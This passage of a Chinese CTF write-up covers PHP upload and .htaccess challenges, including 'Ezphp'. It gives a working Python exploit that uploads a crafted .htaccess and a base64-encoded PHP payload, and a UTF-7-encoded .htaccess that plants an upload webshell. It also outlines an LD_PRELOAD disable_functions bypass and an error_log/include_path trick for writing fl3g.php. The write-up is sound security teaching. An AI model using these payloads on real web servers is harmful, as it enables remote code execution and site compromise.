编码解码的时候，会把整个文件内容当作字符串解码，意思就是说，WBMP 格式头当然也会被解码，这里需要让文件头凑够足够的位数，比如在<code>\x00\x00\x8a\x39\x8a\x39\x0a</code>中，这里一共有 56 bit，base64 在解码的时候，24 bit 为一组，再分成三个字节进行解码，56 bit 不足 72(24*3 ) bit ，需要去我们添加的数据进行补齐，所以就会造成“污染”了我们构造的编码数据。所以这里我们只需要再增加到 72 bit 即可，也就是 2(16bit) 字节，让文件头与这 2 字节被一起解码即可，解码结果不影响 php 解析即可。</p><p>所以完整脚本如下：</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"><span class="hljs-keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">VALID_WBMP = <span class="hljs-string">b"\x00\x00\x8a\x39\x8a\x39\x0a"</span></span><br><span class="line">URL = <span class="hljs-string">"http://your_url/upload/?"</span></span><br><span class="line">RANDOM_DIRECTORY = <span class="hljs-string">"674b2fcf215d9e16619a0ad3648e704ee50377e5"</span></span><br><span class="line"></span><br><span class="line">COOKIES = {</span><br><span class="line">    <span class="hljs-string">"PHPSESSID"</span> : <span class="hljs-string">"kivnml45mpi9ohknv2i8s8ecoj"</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">upload_content</span><span class="hljs-params">(name, content)</span>:</span></span><br><span class="line"></span><br><span class="line">    data = {</span><br><span class="line">        <span class="hljs-string">"image"</span> : (name, content, <span class="hljs-string">'image/png'</span>),</span><br><span class="line">        <span class="hljs-string">"upload"</span> : (<span class="hljs-literal">None</span>, <span class="hljs-string">"Submit Query"</span>, <span class="hljs-literal">None</span>)</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    response = requests.post(URL, files=data, cookies=COOKIES)</span><br><span class="line"></span><br><span class="line">HT_ACCESS = VALID_WBMP + <span class="hljs-string">b"""</span></span><br><span class="line"><span class="hljs-string">AddType application/x-httpd-php .zedd</span></span><br><span class="line"><span class="hljs-string">php_value auto_append_file "php://filter/convert.base64-decode/resource=source.zedd"</span></span><br><span class="line"><span class="hljs-string">"""</span></span><br><span class="line">TARGET_FILE = VALID_WBMP + <span class="hljs-string">b"AA"</span> + base64.b64encode(<span class="hljs-string">b"""</span></span><br><span class="line"><span class="hljs-string">&lt;?php phpinfo();?&gt;</span></span><br><span class="line"><span class="hljs-string">"""</span>)</span><br><span class="line"></span><br><span class="line">upload_content(<span class="hljs-string">"..htaccess"</span>, HT_ACCESS)</span><br><span class="line">upload_content(<span class="hljs-string">"source.zedd"</span>, TARGET_FILE)</span><br><span class="line">upload_content(<span class="hljs-string">"shell.zedd"</span>, VALID_WBMP)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">response = requests.post(URL + <span class="hljs-string">"/images/"</span> + RANDOM_DIRECTORY + <span class="hljs-string">"/shell.zedd"</span>)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="Get-Shell"><a href="#Get-Shell" class="headerlink" title="Get Shell"></a>Get Shell</h2><p>先看 phpinfo ，果不其然还要 bypass disable_function</p><p></p><figure class="highlight pgsql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,passthru,shell_exec,<span class="hljs-keyword">system</span>,proc_open,popen,pcntl_exec,posix_mkfifo, pg_lo_import, dbmopen, dbase_open, popen, chgrp, chown, chmod, symlink,apache_setenv,define_syslog_variables, posix_getpwuid, posix_kill, posix_mkfifo, posix_setpgid, posix_setsid, posix_uname, proc_close, pclose, proc_nice, proc_terminate,curl_exec,curl_multi_exec,parse_ini_file,show_source,imap_open,fopen,<span class="hljs-keyword">copy</span>,<span class="hljs-keyword">rename</span>,readfile,readlink,tmpfile,tempnam,touch,link,file_put_contents,file,ftp_connect,ftp_ssl_connect</span><br></pre></td></tr></tbody></table></figure><p></p><p>没有禁止 <code>putenv()</code>，那我们就可以用 <code>LD_PRELOAD</code>那一套就行了。然而这里没有权限导致不能直接使用蚁剑的 as_bypass_php_disable_functions 插件，但是我们可以自己写一个上传界面上传我们需要的文件就行了。比如我们可以这么写 <code>.htaccess</code></p><p></p><figure class="highlight pgsql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#define test_width 1337</span></span><br><span class="line"><span class="hljs-meta">#define test_height 1337</span></span><br><span class="line">AddType application/x-httpd-php .xbm</span><br><span class="line">php_flag zend.multibyte <span class="hljs-number">1</span></span><br><span class="line">php_value zend.script_encoding "UTF-7"</span><br><span class="line">php_value auto_append_file .htaccess</span><br><span class="line">#+ADw?php <span class="hljs-keyword">if</span> (isset(+ACQAXw-POST+AFsAIg-upload+ACIAXQ)) +AHsAJA-tmp+AF8-<span class="hljs-type">name</span> +AD0 +ACQAXw-FILES+AFsAIg-image+ACIAXQBbACI-tmp+AF8-<span class="hljs-type">name</span>+ACIAXQA7ACQ-<span class="hljs-type">name</span> +AD0 +ACQAXw-FILES+AFsAIg-image+ACIAXQBbACI-<span class="hljs-type">name</span>+ACIAXQA7ACQ-parts +AD0 explode(+ACI.+ACI, +ACQ-<span class="hljs-type">name</span>)+ADsAJA-ext +AD0 <span class="hljs-keyword">array</span>+AF8-pop(+ACQ-parts)+ADsAJA-<span class="hljs-type">name</span> +AD0 implode(+ACI.+ACI, +ACQ-parts)+ADs-<span class="hljs-keyword">move</span>+AF8-uploaded+AF8-file(+ACQ-tmp+AF8-<span class="hljs-type">name</span>, +ACI./+ACI.+ACQ-<span class="hljs-type">name</span> . +ACI.+ACI . +ACQ-ext)+ADsAfQ?+AD4APA-h1+AD4-Upload your pics+ACEAPA-/h1+AD4APA-form <span class="hljs-keyword">method</span>+AD0AIg-POST+ACI action+AD0AIg?+ACI enctype+AD0AIg-multipart/form-data+ACIAPgA8-<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>+AD0AIg-file+ACI <span class="hljs-type">name</span>+AD0AIg-image+ACIAPgA8-<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>+AD0AIg-submit+ACI <span class="hljs-type">name</span>+AD0-upload+AD4APA-/form+AD4-</span><br></pre></td></tr></tbody></table></figure><p></p><p>UTF-7 解码之后就是：</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">"upload"</span>])) {$tmp_name = $_FILES[<span class="hljs-string">"image"</span>][<span class="hljs-string">"tmp_name"</span>];$name = $_FILES[<span class="hljs-string">"image"</span>][<span class="hljs-string">"name"</span>];$parts = explode(<span class="hljs-string">"."</span>, $name);$ext = array_pop($parts);$name = implode(<span class="hljs-string">"."</span>, $parts);move_uploaded_file($tmp_name, <span class="hljs-string">"./"</span>.$name . <span class="hljs-string">"."</span> . $ext);}<span class="hljs-meta">?&gt;</span>&lt;h1&gt;Upload your pics!&lt;/h1&gt;&lt;form method=<span class="hljs-string">"POST"</span> action=<span class="hljs-string">"?"</span> enctype=<span class="hljs-string">"multipart/form-data"</span>&gt;&lt;input type=<span class="hljs-string">"file"</span> name=<span class="hljs-string">"image"</span>&gt;&lt;input type=<span class="hljs-string">"submit"</span> name=upload&gt;&lt;/form&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p>然后就是上传 .so 文件进行 LD_PRELOAD 那一套了，比较坑的是，拿到 flag 还是需要一个在极短时间内算数的门槛，这里就直接借鉴其他人的脚本了：</p><p></p><figure class="highlight perl hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#!/usr/bin/env perl </span></span><br><span class="line"><span class="hljs-keyword">use</span> warnings;</span><br><span class="line"><span class="hljs-keyword">use</span> strict;</span><br><span class="line"><span class="hljs-keyword">use</span> IPC::Open2;</span><br><span class="line"></span><br><span class="line">$| = <span class="hljs-number">1</span>;</span><br><span class="line"><span class="hljs-keyword">chdir</span> <span class="hljs-string">"/"</span>; <span class="hljs-comment">#!!!!!!!!!!!!!!!!!!!!!!!!!!</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">my</span> $pid = open2(\*out2, \*in2, <span class="hljs-string">'./get_flag'</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">my</span> $reply = &lt;out2&gt;;</span><br><span class="line"><span class="hljs-keyword">print</span> STDOUT $reply; <span class="hljs-comment">#string: solve captcha..</span></span><br><span class="line">$reply = &lt;out2&gt;;</span><br><span class="line"><span class="hljs-keyword">print</span> STDOUT $reply; <span class="hljs-comment">#captcha formula</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">my</span> $answer = <span class="hljs-keyword">eval</span>($reply);</span><br><span class="line"><span class="hljs-keyword">print</span> STDOUT <span class="hljs-string">"answer: $answer\n"</span>; </span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">print</span> in2 <span class="hljs-string">" $answer "</span>; <span class="hljs-comment">#send it to process</span></span><br><span class="line">in2-&gt;flush();</span><br><span class="line"></span><br><span class="line">$reply = &lt;out2&gt;;</span><br><span class="line"><span class="hljs-keyword">print</span> STDOUT $reply; <span class="hljs-comment">#flag :D</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>直接传上去运行就行了。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190830010343.png" alt=""></p><h1 id="Ezphp"><a href="#Ezphp" class="headerlink" title="Ezphp"></a>Ezphp</h1><p>让我们回到本次的主题 Ezphp，题目直接给出了源码</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"> <span class="hljs-meta">&lt;?php</span></span><br><span class="line">    $files = scandir(<span class="hljs-string">'./'</span>); </span><br><span class="line">    <span class="hljs-keyword">foreach</span>($files <span class="hljs-keyword">as</span> $file) {</span><br><span class="line">        <span class="hljs-keyword">if</span>(is_file($file)){</span><br><span class="line">            <span class="hljs-keyword">if</span> ($file !== <span class="hljs-string">"index.php"</span>) {</span><br><span class="line">                unlink($file);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">include_once</span>(<span class="hljs-string">"fl3g.php"</span>);</span><br><span class="line">    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'content'</span>]) || !<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'filename'</span>])) {</span><br><span class="line">        highlight_file(<span class="hljs-keyword">__FILE__</span>);</span><br><span class="line">        <span class="hljs-keyword">die</span>();</span><br><span class="line">    }</span><br><span class="line">    $content = $_GET[<span class="hljs-string">'content'</span>];</span><br><span class="line">    <span class="hljs-keyword">if</span>(stristr($content,<span class="hljs-string">'on'</span>) || stristr($content,<span class="hljs-string">'html'</span>) || stristr($content,<span class="hljs-string">'type'</span>) || stristr($content,<span class="hljs-string">'flag'</span>) || stristr($content,<span class="hljs-string">'upload'</span>) || stristr($content,<span class="hljs-string">'file'</span>)) {</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"Hacker"</span>;</span><br><span class="line">        <span class="hljs-keyword">die</span>();</span><br><span class="line">    }</span><br><span class="line">    $filename = $_GET[<span class="hljs-string">'filename'</span>];</span><br><span class="line">    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">"/[^a-z\.]/"</span>, $filename) == <span class="hljs-number">1</span>) {</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"Hacker"</span>;</span><br><span class="line">        <span class="hljs-keyword">die</span>();</span><br><span class="line">    }</span><br><span class="line">    $files = scandir(<span class="hljs-string">'./'</span>); </span><br><span class="line">    <span class="hljs-keyword">foreach</span>($files <span class="hljs-keyword">as</span> $file) {</span><br><span class="line">        <span class="hljs-keyword">if</span>(is_file($file)){</span><br><span class="line">            <span class="hljs-keyword">if</span> ($file !== <span class="hljs-string">"index.php"</span>) {</span><br><span class="line">                unlink($file);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    file_put_contents($filename, $content . <span class="hljs-string">"\nJust one chance"</span>);</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>很明显，这里我们可以直接写入<code>.htaccess</code>来 get flag。</p><p>我们可以看到有以下限制：</p><ul><li>每次都会<code>unlink</code>删除当前所有文件</li><li>有 on / html / type / flag / upload / file 关键字大小写过滤</li><li>文件自动包含<code>fl3g.php</code>，但是文件名有<code>/[^a-z\.]/</code>正则限制</li><li>最后还会有<code>\n</code>换行追加数据导致<code>.htaccess</code>解析错误的限制</li></ul><p>这里比赛的时候比较恶心的是 ichunqiu 自动给容器套了一层 nginx 代理，404 或者 500 的时候返回的是 nginx 错误页面…然后当时我是排除了 .htaccess 的利用…然后就偏了…</p><p>有了上题的知识其实我们不难有一些思路：可以利用编码绕过一些判定，例如<code>stristr</code>函数的判断。</p><p>而且这里比较让我们值得注意的是<code>fl3g.php</code>的包含，虽然每次都会首先执行删除当前目录下所有的文件，但是之后又都会去尝试包含<code>fl3g.php</code>，那我们是不是可以有什么操作去写入<code>fl3g.php</code>呢？当然如果通过题目给的写入功能由于有<code>[^a-z\.]</code>正则的存在是肯定写不进去的。</p><p>于是我们需要把写入文件的功能点放在<code>.htaccess</code>关注点上来，根据 <a href="https://www.php.net/manual/en/configuration.changes.php" target="_blank" rel="noopener">How to change configuration settings</a> ，我们可以知道在<code>.htaccess</code>当中我们可以使用几种类型格式来更改 php 配置</p><p></p><figure class="highlight pgsql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">php_value <span class="hljs-type">name</span> <span class="hljs-keyword">value</span></span><br><span class="line"></span><br><span class="line">php_flag <span class="hljs-type">name</span> <span class="hljs-keyword">on</span>|<span class="hljs-keyword">off</span></span><br><span class="line"></span><br><span class="line">php_admin_value <span class="hljs-type">name</span> <span class="hljs-keyword">value</span></span><br><span class="line"></span><br><span class="line">php_admin_flag <span class="hljs-type">name</span> <span class="hljs-keyword">on</span>|<span class="hljs-keyword">off</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>虽然<code>flag</code>被作为关键字过滤了，但是无论是<code>php_flag</code>还是<code>php_amdin_flag</code>只是<code>php_value</code>的简化，能通过<code>php_flag</code>设置的参数我们大部分还是都可以用<code>php_value</code>去设置的，虽然文档有以下说明：</p><blockquote><p>​    <strong>Note</strong>: Don’t use <code>php_value</code> to set boolean values. <code>php_flag</code> (see below) should be used instead.</p></blockquote><p>在 <a href="https://www.php.net/manual/en/ini.list.php" target="_blank" rel="noopener">List of php.ini directives</a> 当中我们可以找到支持更改的 php 配置选项，其中有几个我们值得去关注。</p><h3 id="One-Way-error"><a href="#One-Way-error" class="headerlink" title="One Way-error"></a>One Way-error</h3><blockquote><p>​    <code>error_log</code> <a href="https://www.php.net/manual/en/language.types.string.php" target="_blank" rel="noopener">string</a></p><p>Name of the file where script errors should be logged. The file should be writable by the web server’s user. If the special value <em>syslog</em> is used, the errors are sent to the system logger instead. On Unix, this means syslog(3) and on Windows it means the event log. See also: <a href="https://www.php.net/manual/en/function.syslog.php" target="_blank" rel="noopener">syslog()</a>. If this directive is not set, errors are sent to the SAPI error logger. For example, it is an error log in Apache or <em>stderr</em> in CLI. See also <a href="https://www.php.net/manual/en/function.error-log.php" target="_blank" rel="noopener">error_log()</a>.</p></blockquote><p><code>error_log</code>可以把<code>error_reporting</code>设置的错误等级写入到设置的文件当中，这个看起来我们可以利用该函数来就进行报错写入文件，但是对于一开始就删除当前文件夹下所有文件的操作，即使我们可以写入自定义内容，也会被删除。所以我们可能还需要找另外一条路径使得该文件可以保存下来。</p><blockquote><p>​    <code>include_path</code> <a href="https://www.php.net/manual/en/language.types.string.php" target="_blank" rel="noopener">string</a></p><p>Specifies a list of directories where the <a href="https://www.php.net/manual/en/function.require.php" target="_blank" rel="noopener">require</a>, <a href="https://www.php.net/manual/en/function.include.php" target="_blank" rel="noopener">include</a>, <a href="https://www.php.net/manual/en/function.fopen.php" target="_blank" rel="noopener">fopen()</a>, <a href="https://www.php.net/manual/en/function.file.php" target="_blank" rel="noopener">file()</a>, <a href="https://www.php.net/manual/en/function.readfile.php" target="_blank" rel="noopener">readfile()</a> and <a href="https://www.php.net/manual/en/function.file-get-contents.php" target="_blank" rel="noopener">file_get_contents()</a> functions look for files. The format is like the system’s PATH environment variable: a list of directories separated with a colon in Unix or semicolon in Windows.</p><p>PHP considers each entry in the include path separately when looking for files to include. It will check the first path, and if it doesn’t find it, check the next path, until it either locates the included file or returns with a <a href="https://www.php.net/manual/en/ini.core.php" target="_blank" rel="noopener">warning</a> or an <a href="https://www.php.net/manual/en/ini.core.php" target="_blank" rel="noopener">error</a>. You may modify or set your include path at runtime using <a href="https://www.php.net/manual/en/function.set-include-path.php" target="_blank" rel="noopener">set_include_path()</a>.</p></blockquote><p>在阅读文档我们还可以发现<code>include_path</code>这个设置，他可以指定<code>include</code>等包含函数包含的环境路径，而题目代码使用的是<code>scandir('./');</code>作为获取当前文件的操作，只是删除当前文件，而<code>error_log</code>又可以指定路径。所以我们大概可以有这么个思路：</p><ul><li>使用<code>error_log</code>指定一个非当前文件路径的可写路径，例如<code>/tmp/fl3g.php</code></li><li>利用<code>include_path</code>指定包含的环境路径为<code>/tmp</code></li><li>这样<code>include</code>包含的时候，就是包含到了<code>/tmp/fl3g.php</code></li></ul><p>这样就可以绕过删除当前文件夹下所有文件的操作了。</p><p>接下来就是<code>error_log</code>写文件内容的问题了，让我们本地试试看，为了方便，按照上面的思路直接写一个<code>.htaccess</code>在当前文件夹下，内容是</p><p></p><figure class="highlight ceylon hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php<span class="hljs-number">_</span><span class="hljs-keyword">value</span> error<span class="hljs-number">_</span>log /tmp/fl<span class="hljs-number">3</span>g.php</span><br><span class="line">php<span class="hljs-number">_</span><span class="hljs-keyword">value</span> include<span class="hljs-number">_p</span>ath /tmp</span><br></pre></td></tr></tbody></table></figure><p></p><p>访问<code>index.php</code>，得到的错误有</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Warning: <span class="hljs-keyword">include_once</span>(fl3g.php): failed to open stream: No such file <span class="hljs-keyword">or</span> directory in /xxx/index.php on line <span class="hljs-number">10</span></span><br><span class="line"></span><br><span class="line">Warning: <span class="hljs-keyword">include_once</span>(): Failed opening <span class="hljs-string">'fl3g.php'</span> <span class="hljs-keyword">for</span> inclusion (include_path=<span class="hljs-string">'.:/Applications/MAMP/bin/php/php7.1.26/lib/php'</span>) in /xxx/index.php on line <span class="hljs-number">10</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>这时候<code>/tmp/fl3g.php</code>当中的内容也是上面的内容，这时候<code>.htaccess</code>因为我们访问了过一次<code>index.php</code>被删除了，所以我们需要再写一次<code>.htaccess</code>，还是一样的内容。</p><p>接着访问<code>index.php</code>，可以看见我们包含的效果如下：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH